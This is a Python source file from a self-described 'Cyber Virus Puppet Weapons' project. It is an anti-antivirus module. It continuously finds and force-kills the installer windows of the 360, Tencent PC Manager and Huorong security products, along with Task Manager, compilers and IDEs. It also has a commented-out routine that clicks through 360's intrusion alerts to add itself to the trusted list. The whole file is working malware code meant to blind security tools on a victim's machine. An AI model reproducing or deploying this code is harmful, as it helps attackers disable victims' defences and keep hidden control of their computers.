# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLhread/Thread_AntiVirusSoftware
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Anti-anti-virus software, through screen recognition and other methods to fight anti-virus software,
# Because the technology update no longer needs to directly fight with anti-virus software,
# So there is no need to continue to use screen recognition,
# And at the same time automatically prevent the installation of anti-virus software and the start of
# Some programs that are not conducive to the project.


from TLib import *
from TLib.T_imports import *


class AntiVirusSoftwareTools:
    def __init__(self, KeMouse: 'T_KeMouse.KeMouse', OCRPath: str):
        self.KeMouse=KeMouse
        self.OCRPath=OCRPath
        self.__init_values__()
    def __init_values__(self):
        self.temp=os.getenv("temp")
        self.OCR_Down=os.path.join(self.OCRPath, "Down.png")
        self.OCR_NFTB=os.path.join(self.OCRPath, "NFTB.png")
        self.OCR_AcceptAll=os.path.join(self.OCRPath, "AcceptAll.png")
        self.OCR_AddToBelive=os.path.join(self.OCRPath, "AddToBelive.png")
        self.OCR_CloseBeliveWindow=os.path.join(self.OCRPath, "CloseBeliveWindow.png")
    #def GetWindowsByClass(self, className):
    #    try:
    #        windows = []
    #        def EnumWindowsCallback(hwnd, _):
    #            try: currentClassName = win32gui.GetClassName(hwnd)
    #            except: return False
    #            if currentClassName == className: windows.append(hwnd)
    #            return True
    #        win32gui.EnumWindows(EnumWindowsCallback, None)
    #        return windows
    #    except:
    #        print("GetWindowsByClass Error")
    #        return []
    def GetWindowsByClass(self, className):
        try:
            return win32gui.FindWindow(className, None)
        except Exception as e:
            print(f"GetFirstWindowByClass Error: {e}")
            return None
    def GetWindowCoordinates(self, hwnd):
        try:
            rect = win32gui.GetWindowRect(hwnd)
            left = rect[0]
            top = rect[1]
            right = rect[2]
            bottom = rect[3]
            return left, top, right, bottom
        except:
            return False, False, False, False
    def GetSomeWindow(self, BanTitle, BanName):
        self._r=False
        def enum_callback(hwnd, _):
            if not user32.IsWindowVisible(hwnd):
                return True
            title_length = user32.GetWindowTextLengthW(hwnd)
            if title_length <= 0:
                return True
            title = ctypes.create_unicode_buffer(title_length + 1)
            user32.GetWindowTextW(hwnd, title, title_length + 1)
            pid = ctypes.wintypes.DWORD()
            user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            try:
                exe_path = psutil.Process(pid.value).exe()
                title=title.value
                if any(_ in title for _ in BanTitle) or any(_ in exe_path for _ in BanName):
                    self._r={"name": title, "pid": pid.value, "exe": exe_path}
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
            return True
        user32 = ctypes.windll.user32
        WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.wintypes.BOOL, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
        user32.EnumWindows(WNDENUMPROC(enum_callback), 0)
        return self._r


class AntiVirusSoftware(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination'):
        self.master=master
        self.Tools = AntiVirusSoftwareTools(self.master.KeMouse, self.master.__ocr_path__)
        self.desc="Anti Virus Software"
        self.__init_values__()
        self.KillInstallFor360()
        self.KillInstallForTX()
        self.KillInstallForHR()
        if self.master.WorkMod == "exe" and not os.path.exists(f"C:\\DEVELOPER.INI"):
            self.KillInstallForOther()
        self.Killer()
        self.AddEditor("KillFlan", "KillFan", "str")
        self.AddEditor("BanTitle", "BanTitle", "json")
        self.AddEditor("BanName", "BanName", "json")
        #self.Accept360Window()
    def __init_values__(self):
        self.KillFlan=True
        self.BanTitle=[]
        self.BanName=[]
    def __KillInstallFor_Template__(self, BanTitle: list, BanName: list):
        self.BanTitle+=BanTitle
        self.BanName+=BanName
    def KillInstallForOther(self):
        self.__KillInstallFor_Template__([], ["frpc.exe","frps.exe",# "nginx.exe"
                                              #"python.exe", "pythonw.exe",
                                              "taskmgr.exe", "code.exe",
                                              "gcc.exe", "g++.exe", "clang.exe", "clang++.exe", "cl.exe", "make.exe", "cmake.exe",
                                              #"java.exe", "javaw.exe",
                                              "pycharm64.exe", "pycharm.exe",
                                              "mysqld.exe",# "ollama.exe"
                                              ]) # Programs of not allowed running
    def KillInstallFor360(self):
        self.__KillInstallFor_Template__(["360安全卫士-安装", "-安装"], ["inst.exe"])
    def KillInstallForTX(self):
        self.__KillInstallFor_Template__(["电脑管家", "腾讯电脑管家在线安装程序"], ["inst.exe"])
    def KillInstallForHR(self):
        self.__KillInstallFor_Template__(["Installing Huorong", "安装火绒"], [])
    @asyncs
    def Killer(self):
        while self.KillFlan and not self.ShouldStop():
            WI=self.Tools.GetSomeWindow(self.BanTitle, self.BanName)
            if WI:
                os.system(f"taskkill /F /PID {WI["pid"]}")
                os.system(f"taskkill /F /IM {os.path.basename(WI["exe"])}")
            time.sleep(2)
    def Accept360Window(self):
        while not self.ShouldStop():
            hwnd=self.Tools.GetWindowsByClass("Q360HIPSClass")
            if hwnd:
                self.logger.Debug("AGAINST WITH 360 !")
                #for hwnd in matchingWindows:
                #windowName = win32gui.GetWindowText(hwnd)
                #TLX, TXY, BRX, BRY = self.GetWindowCoordinates(hwnd)
                #pyautogui.click(BRX - 50, BRY - 40)
                #pyautogui.click(BRX - 50, BRY + 30)
                #windowName = win32gui.GetWindowText(hwnd)
                time.sleep(0.3)
                LX, LY, RX, RY = self.Tools.GetWindowCoordinates(hwnd)
                if not LX:
                    continue
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_CloseBeliveWindow, button='left', sleep=0.1):
                #    self.logger.Success("Choose Close Belive Window ! Please ReStart !")
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_AddToBelive, button='left', sleep=0.1):
                #    self.logger.Success("Choose AddToBelive ! Please ReStart !")
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_NFTB, button='left', sleep=0.1):
                #    self.logger.Success("Choose NFTB ! Start Error!")
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_Down, button='left', sleep=0.5, search_area=search_area):
                #    self.logger.Successt("Choose Down !")
                #if self.KeMouse.ClickTargetPNGAC(self.OCR_AcceptAll, button='left', sleep=0.1, search_area=search_area):
                #    self.logger.Success("Choose Accept All !")
                _pos, _confidence = self.Tools.KeMouse.find_template(self.Tools.OCR_Down, search_area=(LX,LY,RX,RY))
                if not _pos or _confidence < 0.97: continue
                self.logger.Success(f"[OCR] Donw ({_pos[0]}, {_pos[1]}) Confidence: {_confidence}")
                self.Tools.KeMouse.click(_pos[0], _pos[1])

                time.sleep(0.2)

                #(_pos[0]+(RX-LX)//2,_pos[1]+(RY-LY)-(RY-LY)//4,RX,RY+100)
                _pos2, _confidence2 = self.Tools.KeMouse.find_template(self.Tools.OCR_AcceptAll, search_area=(_pos[0]+(RX-LX)//2,_pos[1]+3*(RY-LY)//4,RX,RY+100))
                if not _pos2: continue
                self.logger.Success(f"[OCR] AcceptAll ({_pos2[0]}, {_pos2[1]}) Confidence: {_confidence2}")
                if _confidence2 > 0.97: self.Tools.KeMouse.click(_pos[0], _pos[1])
                else:
                    _pos3, _confidence3 = self.Tools.KeMouse.find_template(self.Tools.OCR_AddToBelive, search_area=(LX,LY+(RY-LY)//2,RX-(RX-LX)//2,RY))
                    self.logger.Success(f"[OCR] AcceptAll ({_pos3[0]}, {_pos3[1]}) Confidence: {_confidence3}")
                    if not _pos3: continue
                    if _confidence3 > 0.97: self.Tools.KeMouse.click(_pos[0], _pos3[1])
            time.sleep(0.2)
